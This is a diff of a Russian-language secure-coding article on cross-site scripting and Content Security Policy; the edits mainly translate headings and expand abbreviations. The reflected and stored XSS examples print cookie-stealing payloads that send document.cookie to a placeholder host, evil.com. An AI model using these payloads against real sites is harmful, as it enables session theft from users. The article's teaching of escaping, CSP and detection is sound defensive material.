@@ -1,10 +1,10 @@
 # XSS (Cross-Site Scripting) и CSP (Content Security Policy)
 
-## Definitions
+## Определения
 
-**XSS (Cross-Site Scripting)** — атака на веб-приложения, при которой злоумышленник внедряет вредоносный JavaScript-код на страницы, просматриваемые другими пользователями. Цель — кража данных, выполнение действий от имени пользователя или изменение содержимого страницы.
+**XSS (Cross-Site Scripting — Межсайтовый скриптинг)** — атака на веб-приложения, при которой злоумышленник внедряет вредоносный JavaScript-код на страницы, просматриваемые другими пользователями. Цель — кража данных, выполнение действий от имени пользователя или изменение содержимого страницы.
 
-**CSP (Content Security Policy)** — механизм безопасности через HTTP-заголовок `Content-Security-Policy`. Контролирует, какие ресурсы (скрипты, стили, изображения, фреймы) браузер может загружать и выполнять, являясь эффективным рубежом защиты от XSS.
+**CSP (Content Security Policy — Политика безопасности контента)** — механизм безопасности через HTTP (Hypertext Transfer Protocol) заголовок `Content-Security-Policy`. Контролирует, какие ресурсы (скрипты, стили, изображения, фреймы) браузер может загружать и выполнять, являясь эффективным рубежом защиты от XSS.
 
 ### Классификация типов XSS
 
@@ -12,23 +12,23 @@
 | :--- | :--- | :--- |
 | **Stored (Хранимый)** | Скрипт сохраняется на сервере (комментарии, профиль, сообщения) | Самый опасный — затрагивает всех пользователей страницы |
 | **Reflected (Отражённый)** | Скрипт передаётся через HTTP-запрос (URL-параметр, форма) и отражается в ответе | Требует социальной инженерии — жертва должна перейти по ссылке |
-| **DOM-based** | Атака полностью на стороне клиента через небезопасную обработку данных JavaScript (`innerHTML`, `eval`, `location.hash`) | Сервер не участвует — сложно обнаружить SAST, нужен DAST |
-| **Mutation-based** | Браузер мутирует DOM после загрузки, и вредоносный код появляется в результате парсинга | Редкий тип, эксплуатирует особенности HTML-парсеров браузеров |
+| **DOM-based (На основе DOM)** | Атака полностью на стороне клиента через небезопасную обработку данных JavaScript в DOM (Document Object Model) (`innerHTML`, `eval`, `location.hash`) | Сервер не участвует — сложно обнаружить SAST (Static Application Security Testing), нужен DAST (Dynamic Application Security Testing) |
+| **Mutation-based (На основе мутации)** | Браузер мутирует DOM после загрузки, и вредоносный код появляется в результате парсинга | Редкий тип, эксплуатирует особенности HTML (Hypertext Markup Language) парсеров браузеров |
 
 ### Последствия XSS-атак
 
-- Кража сессионных cookies и токенов (флаг `HttpOnly` — частичная защита)
+- Кража сессионных cookies (куки) и токенов (флаг `HttpOnly` — частичная защита)
 - Подмена содержимого страницы (defacing)
 - Перенаправление на фишинговые сайты
-- Выполнение действий от имени пользователя (CSRF через XSS)
+- Выполнение действий от имени пользователя (CSRF (Cross-Site Request Forgery) через XSS)
 - Перехват нажатий клавиш (keylogging)
-- Распространение вредоноса через скомпрометированную страницу
+- Распространение вредоносного ПО через скомпрометированную страницу
 
-## Basic Concepts
+## Основные концепции
 
 ### Механизм отражённой XSS-атаки
 
-```
+```text
 Злоумышленник → отправляет жертве ссылку:
   https://example.com/search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
 
@@ -39,21 +39,19 @@
 
 ### Хранимая XSS — цепочка
 
-```
-1. Злоумышленник сохраняет комментарий: <img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
-2. Комментарий сохраняется в БД
+1. Злоумышленник сохраняет комментарий: `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">`
+2. Комментарий сохраняется в базе данных
 3. Любой пользователь открывает страницу — браузер исполняет скрипт
-```
 
-### DOM-based XSS — примеры sink'ов
+### DOM-based XSS — примеры sink-функций
 
-Sink — функция, которая исполняет переданные данные как код:
+Sink (приёмник) — функция, которая исполняет переданные данные как код:
 
-| Sink | Почему опасен |
+| Приёмник | Почему опасен |
 | :--- | :--- |
 | `element.innerHTML = userInput` | Парсит HTML и исполняет скрипты |
 | `element.outerHTML = userInput` | Аналогично innerHTML |
-| `eval(userInput)` | Прямое исполнение JS |
+| `eval(userInput)` | Прямое исполнение JS (JavaScript) |
 | `document.write(userInput)` | Вставка и исполнение в DOM |
 | `setTimeout(userInput, 0)` | Исполнение строки как кода |
 | `location.href = userInput` | Редирект на контролируемую страницу |
@@ -63,7 +61,7 @@ Sink — функция, которая исполняет переданные 
 ### Фундаментальные принципы защиты от XSS
 
 1. **Экранирование вывода (Output Encoding)** — основной метод. Данные преобразуются перед вставкой в HTML: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;`
-2. **Валидация ввода (Allowlist)** — сервер проверяет формат, тип и длину данных
+2. **Валидация ввода (Allowlist / Белый список)** — сервер проверяет формат, тип и длину данных
 3. **Современные фреймворки** — React, Vue, Angular автоматически экранируют вывод
 4. **Content-Security-Policy** — последний рубеж, блокирует исполнение неразрешённых скриптов
 5. **HttpOnly + Secure флаги cookie** — защита от кражи сессии через XSS
@@ -78,13 +76,13 @@ CSP определяет белый список доверенных источ
 | :--- | :--- |
 | `default-src` | Источник по умолчанию для всех типов контента |
 | `script-src` | Источники JavaScript |
-| `style-src` | Источники CSS |
+| `style-src` | Источники CSS (Cascading Style Sheets) |
 | `img-src` | Источники изображений |
-| `connect-src` | Источники для fetch/XMLHttpRequest/WebSocket |
+| `connect-src` | Источники для fetch / XMLHttpRequest / WebSocket |
 | `font-src` | Источники шрифтов |
 | `frame-src` / `frame-ancestors` | Источники фреймов / кто может встраивать страницу |
 | `object-src` | Источники плагинов (Flash, Java) |
-| `base-uri` | Ограничивает URL в `<base>` |
+| `base-uri` | Ограничивает URL (Uniform Resource Locator) в `<base>` |
 | `form-action` | Ограничивает URL для отправки форм |
 
 #### Специальные значения
@@ -95,9 +93,9 @@ CSP определяет белый список доверенных источ
 | `'none'` | Запретить всё |
 | `'unsafe-inline'` | Разрешить inline-скрипты/стили (ослабляет защиту) |
 | `'unsafe-eval'` | Разрешить `eval()` и аналоги |
-| `'nonce-<base64>'` | Разрешить скрипт с конкретным nonce |
+| `'nonce-<base64>'` | Разрешить скрипт с конкретным nonce (number used once) |
 | `'sha256-<hash>'` | Разрешить скрипт с конкретным хешем |
-| `https:` | Разрешить ресурсы только по HTTPS |
+| `https:` | Разрешить ресурсы только по HTTPS (Hypertext Transfer Protocol Secure) |
 
 #### Режим Report-Only
 
@@ -107,7 +105,7 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
 
 Политика не блокирует ресурсы, а отправляет отчёты о нарушениях на указанный `report-uri` (или через `report-to` для CSP Level 3). Позволяет безопасно тестировать CSP перед полным внедрением.
 
-#### Nonce и Hashes
+#### Nonce и хеши
 
 Механизмы для разрешения конкретных inline-скриптов без `'unsafe-inline'`:
 
@@ -121,9 +119,9 @@ Content-Security-Policy: script-src 'nonce-abc123' 'self'
 
 Nonce генерируется заново на каждый запрос, хеш вычисляется по содержимому скрипта.
 
-### Trusted Types (дополнительная защита)
+### Trusted Types (Дополнительная защита)
 
-[Trusted Types](https://web.dev/trusted-types/) — браузерный API, запрещающий передачу строк в DOM-sink'и без явного создания «доверенного значения» через sanitizer:
+[Trusted Types](https://web.dev/trusted-types/) — браузерный API (Application Programming Interface), запрещающий передачу строк в DOM-sink'и без явного создания «доверенного значения» через sanitizer (санитайзер):
 
 ```javascript
 // Без Trusted Types — уязвимо
@@ -135,7 +133,7 @@ element.innerHTML = userInput;
 
 Включается через CSP: `Content-Security-Policy: require-trusted-types-for 'script';`
 
-## Practical Scenarios
+## Практические сценарии
 
 ### Пример уязвимого кода и защиты
 
@@ -149,7 +147,7 @@ echo "Поисковый запрос: " . $_GET['q'];
 echo "Поисковый запрос: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
 ```
 
-**Node.js (Express) — stored XSS:**
+**Node.js (Express) — хранимая XSS:**
 
 ```javascript
 // УЯЗВИМО — прямой вывод в шаблоне
@@ -201,29 +199,29 @@ Content-Security-Policy:
 | :--- | :--- | :--- |
 | **React** | JSX экранирует `{variable}` по умолчанию | Опасен `dangerouslySetInnerHTML` |
 | **Vue.js** | Интерполяция `{{ variable }}` экранируется | `v-html` отключает защиту |
-| **Angular** | Авто-экранирование, sanitization DOM | `DomSanitizer.bypassSecurityTrustHtml` — с осторожностью |
+| **Angular** | Авто-экранирование, санитайзинг DOM | `DomSanitizer.bypassSecurityTrustHtml` — с осторожностью |
 | **Django Templates** | Авто-экранирование `{{ variable }}` | Фильтр `|safe` отключает |
 | **Jinja2 (Flask)** | Авто-экранирование `{{ variable }}` | Фильтр `|safe` отключает |
 
-**Критично:** даже во фреймворках с авто-экранированием разработчик может вручную отключить защиту — необходимы code review и SAST.
+**Критично:** даже во фреймворках с авто-экранированием разработчик может вручную отключить защиту — необходимы code review (обзор кода) и SAST.
 
 ### Инструменты обнаружения XSS
 
 | Инструмент | Тип | Назначение |
 | :--- | :--- | :--- |
-| [XSStrike](https://github.com/s0md3v/XSStrike) | Exploitation | Автоматическое обнаружение и эксплуатация XSS |
-| [dalfox](https://github.com/hahwul/dalfox) | Exploitation | Быстрый XSS-сканер с поддержкой blind XSS |
-| SAST (SonarQube, Semgrep, Checkmarx) | Static analysis | Поиск неэкранированного вывода — [обзор SAST](../../CI-CD/DevSecOps/sast_overview.md) |
-| DAST (OWASP ZAP, Burp Suite) | Dynamic analysis | Тестирование работающего приложения — [обзор DAST](../../CI-CD/DevSecOps/dast_overview.md) |
-| WAF (ModSecurity, CloudFlare) | Runtime protection | Блокировка известных XSS-паттернов — [WAF](./waf.md) |
+| [XSStrike](https://github.com/s0md3v/XSStrike) | Эксплуатация | Автоматическое обнаружение и эксплуатация XSS |
+| [dalfox](https://github.com/hahwul/dalfox) | Эксплуатация | Быстрый XSS-сканер с поддержкой blind XSS |
+| SAST (SonarQube, Semgrep, Checkmarx) | Статический анализ | Поиск неэкранированного вывода — [обзор SAST](../../CI-CD/DevSecOps/sast_overview.md) |
+| DAST (OWASP ZAP, Burp Suite) | Динамический анализ | Тестирование работающего приложения — [обзор DAST](../../CI-CD/DevSecOps/dast_overview.md) |
+| WAF (ModSecurity, CloudFlare) | Защита во время выполнения | Блокировка известных XSS-паттернов — [WAF](./waf.md) |
 
-## Additional Information
+## Дополнительная информация
 
 ### Связанные уязвимости
 
 - **CSRF (Cross-Site Request Forgery):** Выполнение несанкционированных запросов от имени пользователя — XSS усиливает CSRF, обходя CSRF-защиту
-- **Command Injection:** Внедрение системных команд — [SAST/DAST уязвимости](../../CI-CD/DevSecOps/sast_dast_vulnerabilities.md)
-- **SQL Injection:** Внедрение SQL-запросов — [SQL Injection](./sql_injection.md)
+- **Command Injection (Инъекция команд):** Внедрение системных команд — [SAST/DAST уязвимости](../../CI-CD/DevSecOps/sast_dast_vulnerabilities.md)
+- **SQL Injection (SQL-инъекция):** Внедрение SQL-запросов — [SQL Injection](./sql_injection.md)
 
 ### OWASP и стандарты
 
@@ -234,9 +232,9 @@ Content-Security-Policy:
 
 ### WAF как виртуальный патч
 
-WAF не устраняет уязвимость, но обеспечивает временную защиту ([Virtual Patching](./waf.md)):
+WAF (Web Application Firewall) не устраняет уязвимость, но обеспечивает временную защиту ([Virtual Patching](./waf.md)):
 
-```
+```apache
 # Пример правила ModSecurity (OWASP CRS)
 SecRule ARGS "@detectXSS" \
     "id:941100,\
@@ -258,11 +256,11 @@ SecRule ARGS "@detectXSS" \
 
 Эффективная защита от XSS требует комбинации мер:
 
-1. **Output Encoding** — основной рубеж (экранирование при выводе)
-2. **Input Validation (allowlist)** — фильтрация по формату и типу на входе
+1. **Output Encoding (Экранирование вывода)** — основной рубеж (экранирование при выводе)
+2. **Input Validation (валидация на входе по белому списку)** — фильтрация по формату и типу на входе
 3. **Безопасные фреймворки** — React, Vue, Angular с авто-экранированием
 4. **CSP** — блокировка исполнения неразрешённых скриптов
 5. **HttpOnly + Secure cookie** — защита сессии от кражи
-6. **WAF** — защита от известных паттернов и zero-day
-7. **SAST/DAST в CI/CD** — автоматическое обнаружение до production — [DevSecOps процесс](../../CI-CD/DevSecOps/devsecops_overview.md)
+6. **WAF** — защита от известных паттернов и zero-day (уязвимостей нулевого дня)
+7. **SAST/DAST в CI/CD (Continuous Integration / Continuous Deployment)** — автоматическое обнаружение до production (промышленной среды) — [DevSecOps процесс](../../CI-CD/DevSecOps/devsecops_overview.md)
 8. **Trusted Types** — дополнительная защита от DOM-based XSS на уровне браузера
